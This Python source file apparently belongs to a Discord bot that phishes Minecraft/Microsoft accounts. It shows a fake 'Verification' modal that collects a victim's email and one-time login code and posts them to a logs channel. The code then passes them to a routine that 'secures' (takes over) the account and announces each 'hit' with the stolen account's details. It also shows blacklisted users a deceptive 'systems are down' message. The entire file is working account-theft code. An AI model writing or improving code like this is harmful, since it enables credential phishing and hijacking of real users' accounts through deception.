from database.database import DBConnection
from urllib.parse import quote
from discord import ui, Embed
import datetime
import discord
import json

from views.buttons.embedOptions import ButtonOptions
from views.buttons.accountInfo import accountInfo

from views.utils.startSecure import startSecuringAccount
from views.utils.initialSession import getSession

class MyModalTwo(ui.Modal):
    def __init__(self, username, email, flowtoken):
        super().__init__(title="Verification")
        self.username = quote(username)
        self.email = email
        self.flowtoken = flowtoken
        self.config = json.load(open("config.json", "r+"))
        self.add_item(ui.InputText(label="Code", required=True, max_length=6))

    async def callback(self, interaction: discord.Interaction) -> None:
        code = self.children[0].value

        print(f"Usernameo: {self.username}")
        logs_channel = await interaction.client.fetch_channel(self.config["discord"]["logs_channel"])
        hits_channel = await interaction.client.fetch_channel(self.config["discord"]["accounts_channel"])

        # Blacklisted Users
        with DBConnection() as database:
            if interaction.user.id in database.getBlacklistedUsers():
                await interaction.response.send_message(
                    embed = Embed(
                        title = "Could not verify",
                        description = "Our systems seem to be down at the moment. Please try again in a few hours.",
                        color = 0xFF5C5C
                    ), 
                    ephemeral = True
                )

                await logs_channel.send(
                    embed = Embed(
                        title = f"User | {interaction.user.name} ({interaction.user.id})",
                        description = f"**Email** | **Status** | **Reason**\n```{self.email} | Refused to Verify | User has been blacklisted```",
                        timestamp = datetime.datetime.now(),
                        colour = 0xFF5C5C                         
                    ).set_thumbnail(url=f"https://visage.surgeplay.com/full/512/{self.username}"),
                    view = ButtonOptions(interaction.user)
                )
                return

        embed = discord.Embed(
            title = f"User | {interaction.user.name}",
            description=f"**Email** | **Status**\n```{self.email} | Got Code | {code}```",
            timestamp = datetime.datetime.now(),
            colour = 0x79D990,                           
        )
        
        if self.username and self.username.strip():
            thumbnail_url = f"https://visage.surgeplay.com/full/512/{self.username}"
            embed.set_thumbnail(url=thumbnail_url)

        await interaction.response.defer(ephemeral=True)

        await logs_channel.send("**This Account is being automaticly secured**")
        await logs_channel.send(embed = embed, view = ButtonOptions(interaction.user.id))

        await interaction.followup.send(
            embed = discord.Embed(
                title = "Processing...",
                description = "⌛ Please allow us to proccess your roles",
                color = 0xDE755B
            ),
            ephemeral = True
        )

        self.session = getSession()

        # Embeds | Account, Minecraft, SSID, Extra Info, Inbox (separate)
        securedAccount = await startSecuringAccount(self.session, self.email, self.flowtoken, code)
        
        if not securedAccount:

            embed = discord.Embed(
                title = f"User | {interaction.user.name} ({interaction.user.id})",
                description = f"**Email** | **Status** | **Reason**\n```{self.email} | Failed to secure | Invalid Code Entered```",
                timestamp = datetime.datetime.now(),
                colour = 0xFF5C5C                  
            )
            
            if self.username and self.username.strip():
                embed.set_thumbnail(url=f"https://visage.surgeplay.com/full/512/{self.username}")
            
            await logs_channel.send(
                embed = embed,
                view = ButtonOptions(interaction.user)
            )

            return
            
        await hits_channel.send("@everyone **Successfully secured an account**")
        await hits_channel.send(embed = securedAccount["details"]["stats_embed"])
        await hits_channel.send(
            embed = securedAccount["hit_embed"],
            view = accountInfo(
                securedAccount["details"]
            )
        )
